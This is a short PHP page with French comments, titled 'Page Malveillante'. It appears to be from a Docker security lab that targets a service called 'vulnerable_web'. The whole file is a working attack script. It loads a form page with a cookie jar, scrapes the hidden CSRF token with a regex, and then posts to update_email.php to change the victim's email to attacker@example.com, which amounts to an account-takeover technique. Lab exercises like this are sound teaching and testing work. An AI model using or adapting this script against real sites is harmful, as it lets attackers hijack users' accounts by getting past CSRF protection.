<!DOCTYPE html>
<html>
<head>
    <title>Page Malveillante</title>
</head>
<body>
    <h1>Page Malveillante</h1>
    <?php
    // Définir l'URL locale et le port
    $host = 'vulnerable_web'; // Utilisez le nom du service Docker
    $port = '80'; // Port exposé par le conteneur web
    $baseUrl = "http://$host:$port/";

    // Première étape : Récupérer la page contenant le token CSRF
    $url = $baseUrl . 'vulnerable_site.php';
    $ch = curl_init($url);

    // Activer les cookies pour maintenir la session
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Ajouter un délai d'attente de 10 secondes

    $response = curl_exec($ch);

    if ($response === false) {
        // Afficher des informations de débogage en cas d'échec
        $error = curl_error($ch);
        echo '<p>Erreur lors de la récupération du token CSRF : ' . htmlspecialchars($error) . '</p>';
        curl_close($ch);
        exit;
    }

    curl_close($ch);

    // Afficher la réponse pour vérifier son contenu
    echo '<pre>' . htmlspecialchars($response) . '</pre>';

    // Extraire le token CSRF de la réponse
    if (preg_match('/<input type="hidden" name="csrf_token" value="([a-f0-9]{64})"/', $response, $matches)) {
        $csrfToken = $matches[1];

        // Deuxième étape : Soumettre le formulaire avec le token CSRF et l'email de la victime
        $url = $baseUrl . 'update_email.php';
        $data = http_build_query([
            'csrf_token' => $csrfToken,
            'email' => 'attacker@example.com'
        ]);

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Ajouter un délai d'attente de 10 secondes

        $response = curl_exec($ch);

        if ($response === false) {
            // Afficher des informations de débogage en cas d'échec
            $error = curl_error($ch);
            echo '<p>Erreur lors de la soumission du formulaire : ' . htmlspecialchars($error) . '</p>';
        } else {
            echo '<p>Form submitted successfully.</p>';
            echo '<pre>' . htmlspecialchars($response) . '</pre>';
        }

        curl_close($ch);
    } else {
        echo '<p>Token CSRF non trouvé dans la réponse.</p>';
    }
    ?>
</body>
</html>
